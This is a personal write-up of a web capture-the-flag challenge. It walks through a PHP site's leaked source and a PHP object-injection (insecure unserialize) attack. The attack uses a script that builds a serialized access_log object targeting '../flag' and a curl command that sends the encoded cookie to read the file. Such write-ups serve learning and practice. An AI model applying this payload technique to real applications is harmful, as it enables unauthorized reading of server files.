#Description 
	Try to recover the flag stored on this website


At the time of me writing this, this challenge was definitely above my skill level. I was able to get the first step into understanding the challenge, but wasn't able to get the flag on my own. I am going to write up the full process to gain a better understanding of what was going on here, and how to get a challenge like this in the future.

This challenge opens up to just a plain login page, with zero instructions. After running through a bunch of different ideas to no avail, i checked robots.txt and found that there was an unlisted page called admin.phps. You weren't able to get to that page. After this discovery though I tried adding an s to the other php pages I knew of, and was able to pull source code from index.phps.

```
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

This contains a few really great clues, and I decided to try the worst possible one first. I tried some SQL injection on the login page since I now know it's using SQL to pull from a database called "users". This didn't work, so I went to the cookie.phps and authentication.phps pages referenced in this code.

cookie.phps 

```
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

authentication.phps 

```
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

This is where I got stuck. I had an idea of what I was trying to do, but couldn't see the exact vulnerability where I could get a flag. But, I think this was a great challenge, so let's continue so I can have a better idea of how this worked.

the most important part of this has to do with the login cookie. This chunk of code takes the login cookie and deserializes it into the $perm variable to set the permissions.

```
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

however, if it fails it will print the $perm variable. The vulnerability is in the tostring function. 

```
function __toString() {
		return $this->read_log();
	}
```

apparently, toString is a popular PHP method that overrides regular PHP behavior, and it gets called when the object is converted into a string. This means if we get $perm to be our custom variable, we can have file read. 

To do this we have to make a custom acces_log object where we set log_file to ../flag. This can be done with a php script, here's one I found in a write up.

```
<?php 

    class access_log
    {
        public $log_file;

        function __construct($lf) {
            $this->log_file = $lf;
        }

        function __toString() {
            return $this->read_log();
        }

        function append_to_log($data) {
            file_put_contents($this->log_file, $data, FILE_APPEND);
        }

        function read_log() {
            return file_get_contents($this->log_file);
        }
    }

    class permissions
    {
    public $username;
    public $password;

        function __construct($u, $p) {
            $this->username = $u;
            $this->password = $p;
        }

        function __toString() {
            return $u.$p;
        }
    }

    $serialized = serialize(new access_log('../flag'));
    $encoded = urlencode(base64_encode($serialized));

    var_dump($encoded);

    $perm = unserialize(base64_decode(urldecode($encoded)));

    var_dump($perm);
?>
```

after that it's simply passing in the serialized and encoded login cookie through a curl command. 

```
curl -v --cookie 'login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9'
```

This creates the error, which prints the $perm variable, which is our custom access log object that exploits toString in order to print out ../flag.

This was my first foray into PHP and reverse engineering somewhat complex blocks of it. I definitely wouldn't have gotten this on my own, but I feel a little bit better about PHP moving onwards.
